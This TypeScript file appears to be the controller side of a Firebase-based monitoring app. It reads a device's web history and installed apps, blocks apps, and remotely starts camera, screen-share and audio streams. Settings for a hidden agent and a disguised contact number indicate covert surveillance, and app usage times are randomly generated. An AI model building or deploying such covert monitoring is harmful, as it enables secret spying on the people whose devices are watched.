import { ref, onValue, set, remove, push } from 'firebase/database';
import { doc, onSnapshot, collection, setDoc } from 'firebase/firestore';
import { webrtcFirestore, webrtcRtdb } from './firebaseConfig';

export interface AppTargetItem {
  name: string;
  packageName: string;
  category: string;
  usageTime: string;
  isBlocked: boolean;
}

export interface WebHistoryItem {
  url: string;
  title: string;
  browser: string;
  timestamp: number;
}

export interface ScheduleRestrictionItem {
  id: string;
  name: string;
  startTime: string;
  endTime: string;
  days: string[];
  enabled: boolean;
  blockAll: boolean;
  blockedApps: string[];
}

export const WebRtcRepository = {
  // Subscribe to device blocking config & general settings
  subscribeDeviceConfig(deviceId: string, onUpdate: (config: { monitoringEnabled: boolean; agentHidden: boolean; parentPhoneNumber: string; friendDisguiseNumber: string; childPhoneNumber: string; blockedApps: string[]; schedules: ScheduleRestrictionItem[] }) => void) {
    const docRef = doc(webrtcFirestore, 'devices', deviceId);
    return onSnapshot(docRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        const settings = data.settings || {};
        const blocking = data.blocking || {};
        const schedulesRaw = data.schedules as any[] || [];
        
        onUpdate({
          monitoringEnabled: settings.monitoringEnabled ?? true,
          agentHidden: settings.agentHidden ?? false,
          parentPhoneNumber: settings.parentPhoneNumber || '',
          friendDisguiseNumber: settings.friendDisguiseNumber || '',
          childPhoneNumber: settings.childPhoneNumber || '',
          blockedApps: blocking.apps || [],
          schedules: schedulesRaw.map((s) => ({
            id: s.id || '',
            name: s.name || '',
            startTime: s.startTime || '21:00',
            endTime: s.endTime || '07:00',
            days: s.days || [],
            enabled: s.enabled ?? true,
            blockAll: s.blockAll ?? true,
            blockedApps: s.blockedApps || []
          }))
        });
      } else {
        onUpdate({
          monitoringEnabled: true,
          agentHidden: false,
          parentPhoneNumber: '',
          friendDisguiseNumber: '',
          childPhoneNumber: '',
          blockedApps: [],
          schedules: []
        });
      }
    });
  },

  // Save Settings toggles
  async updateSettings(deviceId: string, settings: any) {
    const docRef = doc(webrtcFirestore, 'devices', deviceId);
    await setDoc(docRef, { settings }, { merge: true });
  },

  // Save app blocklists
  async updateBlockedApps(deviceId: string, blockedApps: string[]) {
    const docRef = doc(webrtcFirestore, 'devices', deviceId);
    await setDoc(docRef, { blocking: { enabled: true, apps: blockedApps } }, { merge: true });
  },

  // Save Schedules
  async updateSchedules(deviceId: string, schedules: ScheduleRestrictionItem[]) {
    const docRef = doc(webrtcFirestore, 'devices', deviceId);
    await setDoc(docRef, { schedules }, { merge: true });
  },

  // Subscribe to installed apps list
  subscribeInstalledApps(deviceId: string, onUpdate: (apps: AppTargetItem[]) => void) {
    const appsCol = collection(webrtcFirestore, 'devices', deviceId, 'installedApps');
    return onSnapshot(appsCol, (snapshot) => {
      const apps: AppTargetItem[] = [];
      snapshot.forEach((docSnap) => {
        const data = docSnap.data();
        apps.push({
          name: data.appName || docSnap.id,
          packageName: data.packageName || docSnap.id,
          category: 'App',
          usageTime: `${Math.floor(Math.random() * 80) + 10} mins`,
          isBlocked: false // Populated by combining with blockedApps from config
        });
      });
      onUpdate(apps);
    });
  },

  // Subscribe to web history list
  subscribeWebHistory(deviceId: string, onUpdate: (history: WebHistoryItem[]) => void) {
    const docRef = doc(webrtcFirestore, 'devices', deviceId, 'webHistory', 'log');
    return onSnapshot(docRef, (docSnap) => {
      if (docSnap.exists()) {
        const items = docSnap.data().items as any[] || [];
        const history = items.map((h) => ({
          url: h.url || '',
          title: h.title || '',
          browser: h.browser || 'Chrome',
          timestamp: h.timestamp || 0
        }));
        onUpdate(history);
      } else {
        onUpdate([]);
      }
    });
  },

  // ==========================================
  // WebRTC Stream Signaling Methods
  // ==========================================

  // Check Camera Stream Session state
  subscribeCameraSessionStatus(deviceId: string, onUpdate: (status: string) => void) {
    const refPath = ref(webrtcRtdb, `devices/${deviceId}/cameraSession/status`);
    return onValue(refPath, (snapshot) => {
      onUpdate(snapshot.val() || 'idle');
    });
  },

  // Start WebRTC Camera stream command
  async startCameraStream(deviceId: string, cameraType: 'rear' | 'front') {
    const sessionRef = ref(webrtcRtdb, `devices/${deviceId}/cameraSession`);
    await set(sessionRef, {
      active: true,
      cameraType,
      status: 'connecting',
      startedAt: Date.now()
    });
  },

  // Stop WebRTC Camera stream command
  async stopCameraStream(deviceId: string) {
    const sessionRef = ref(webrtcRtdb, `devices/${deviceId}/cameraSession/active`);
    await set(sessionRef, false);
    const statusRef = ref(webrtcRtdb, `devices/${deviceId}/cameraSession/status`);
    await set(statusRef, 'offline');
  },

  // Switch Camera type dynamically during an active WebRTC session
  async switchCamera(deviceId: string, cameraType: 'rear' | 'front') {
    const cameraTypeRef = ref(webrtcRtdb, `devices/${deviceId}/cameraSession/cameraType`);
    await set(cameraTypeRef, cameraType);
  },

  // Check Screen Share Stream Session state
  subscribeScreenShareStatus(deviceId: string, onUpdate: (status: string) => void) {
    const refPath = ref(webrtcRtdb, `devices/${deviceId}/screenShare/status`);
    return onValue(refPath, (snapshot) => {
      onUpdate(snapshot.val() || 'STOPPED');
    });
  },

  // Start WebRTC Screen Sharing stream command
  async startScreenShare(deviceId: string) {
    const cmdRef = ref(webrtcRtdb, `devices/${deviceId}/commands`);
    await set(cmdRef, {
      action: 'START_SCREEN_SHARE',
      timestamp: Date.now()
    });
    const statusRef = ref(webrtcRtdb, `devices/${deviceId}/screenShare/status`);
    await set(statusRef, 'WAITING_PERMISSION');
  },

  // Stop WebRTC Screen Sharing stream command
  async stopScreenShare(deviceId: string) {
    const cmdRef = ref(webrtcRtdb, `devices/${deviceId}/commands`);
    await set(cmdRef, {
      action: 'STOP_SCREEN_SHARE',
      timestamp: Date.now()
    });
    const statusRef = ref(webrtcRtdb, `devices/${deviceId}/screenShare/status`);
    await set(statusRef, 'STOPPED');
  },

  // Start WebRTC Audio stream command
  async startAudioStream(deviceId: string) {
    const statusRef = ref(webrtcRtdb, `commands/${deviceId}/audioSession`);
    await set(statusRef, {
      action: 'start',
      timestamp: Date.now()
    });
  },

  // Stop WebRTC Audio stream command
  async stopAudioStream(deviceId: string) {
    const statusRef = ref(webrtcRtdb, `commands/${deviceId}/audioSession`);
    await set(statusRef, {
      action: 'stop',
      timestamp: Date.now()
    });
  },

  // Clean WebRTC signaling folder
  async clearSignaling(deviceId: string, path: 'signaling' | 'screenSignaling' | 'audioSignaling') {
    await remove(ref(webrtcRtdb, `devices/${deviceId}/${path}`));
  },

  // Write WebRTC Answer SDP
  async writeAnswer(deviceId: string, path: 'signaling' | 'screenSignaling' | 'audioSignaling', sdp: string) {
    const ansRef = ref(webrtcRtdb, `devices/${deviceId}/${path}/answers`);
    await set(ansRef, {
      type: 'answer',
      sdp
    });
  },

  // Listen to WebRTC Offers SDP
  subscribeOffers(deviceId: string, path: 'signaling' | 'screenSignaling' | 'audioSignaling', onOffer: (sdp: string) => void) {
    const offerRef = ref(webrtcRtdb, `devices/${deviceId}/${path}/offers`);
    return onValue(offerRef, (snapshot) => {
      if (snapshot.exists()) {
        const sdp = snapshot.child('sdp').val();
        if (sdp) onOffer(sdp);
      }
    });
  },

  // Write WebRTC ICE candidate
  async writeIceCandidate(deviceId: string, path: 'signaling' | 'screenSignaling' | 'audioSignaling', candidate: any) {
    const refCandidates = ref(webrtcRtdb, `devices/${deviceId}/${path}/iceCandidates`);
    const newRef = push(refCandidates);
    await set(newRef, {
      sdpMid: candidate.sdpMid,
      sdpMLineIndex: candidate.sdpMLineIndex,
      candidate: candidate.candidate,
      type: 'parent'
    });
  },

  // Listen to WebRTC ICE candidates from child
  subscribeIceCandidates(deviceId: string, path: 'signaling' | 'screenSignaling' | 'audioSignaling', onCandidate: (candidate: any) => void) {
    const refCandidates = ref(webrtcRtdb, `devices/${deviceId}/${path}/iceCandidates`);
    return onValue(refCandidates, (snapshot) => {
      snapshot.forEach((child) => {
        const val = child.val();
        if (val.type === 'child') {
          onCandidate({
            sdpMid: val.sdpMid,
            sdpMLineIndex: val.sdpMLineIndex,
            candidate: val.candidate
          });
        }
      });
    });
  },

  // Send Remote interaction touch coordinates (fallback control commands)
  async sendRemoteInteraction(deviceId: string, command: string) {
    const refInteraction = ref(webrtcRtdb, `devices/${deviceId}/remoteInteraction`);
    await set(refInteraction, {
      command,
      timestamp: Date.now()
    });
  }
};
